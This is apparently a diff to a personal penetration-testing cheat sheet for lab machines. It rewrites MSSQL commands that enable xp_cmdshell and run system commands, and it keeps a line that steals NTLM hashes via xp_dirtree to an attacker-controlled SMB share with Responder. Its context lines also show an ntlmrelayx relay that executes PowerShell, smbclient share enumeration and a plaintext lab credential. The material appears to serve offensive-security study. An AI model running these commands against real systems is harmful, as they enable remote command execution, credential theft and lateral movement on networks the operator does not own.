@@ -840,16 +840,10 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powersh
 ##### Attacking SQL
 ```
 # Enable xp_cmdshell (need priv) and execute command in MSSQL
-1> EXECUTE sp_configure 'show advanced options', 1
-2> GO
-3> RECONFIGURE
-4> GO
-5> EXECUTE sp_configure 'xp_cmdshell', 1
-6> GO
-7> RECONFIGURE
-8> GO
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
-1> xp_cmdshell 'whoami'
+EXEC xp_cmdshell 'whoami'
 
 # Hash stealing using the xp_dirtree command in MSSQL with Responder.
 1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
@@ -2708,6 +2702,9 @@ sudo neo4j console
 # run bloodhound
 bloodhound
 
+# zip file json 
+zip bloodhound_data.zip *.json
+
 ____________________________________________
 (Recon Tool Decision Tree)
 ____________________________________________
@@ -2979,6 +2976,9 @@ smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.vol
 # command smbclient to list and  connect folder shares by anonymous
 smbclient -L //10.129.6.20 -N
 smbclient //10.129.6.20/Development -N
+
+# command smbclient to recurse list  shares 
+smbclient \\\\172.16.7.3\\Department\ Shares -U 'inlanefreight.local\BR086' -c 'recurse;ls'
 
 # command smbclient to download all to local machine 
 prompt off
